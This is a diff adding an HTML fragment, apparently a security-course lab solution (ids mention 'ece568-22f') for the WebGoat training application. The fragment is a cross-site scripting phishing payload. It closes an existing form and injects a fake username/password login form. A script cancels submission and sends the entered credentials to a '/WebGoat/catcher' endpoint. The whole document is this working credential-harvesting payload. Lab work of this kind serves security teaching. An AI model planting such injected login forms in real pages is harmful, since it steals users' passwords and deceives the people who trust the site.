@@ -1,0 +1,23 @@
+</form>
+<form method="get">
+	<br>
+	<label>
+		Username:
+		<input name="username" id="ece568-22f-username"></input>
+	</label>
+	<br>
+	<label>
+		Password:
+		<input name="password" type="password" id="ece568-22f-password"></input>
+	</label>
+	<br>
+	<button id="ece568-22f-submit">Login</button>
+</form>
+<script>
+	document.forms[1].addEventListener("submit", (event) => {
+		event.preventDefault();
+		const form = new FormData(event.target);
+		console.log(form);
+		fetch(`/WebGoat/catcher?PROPERTY=yes&phish-username=${form.get('username')}&phish-password=${form.get('password')}`);
+	});
+</script>
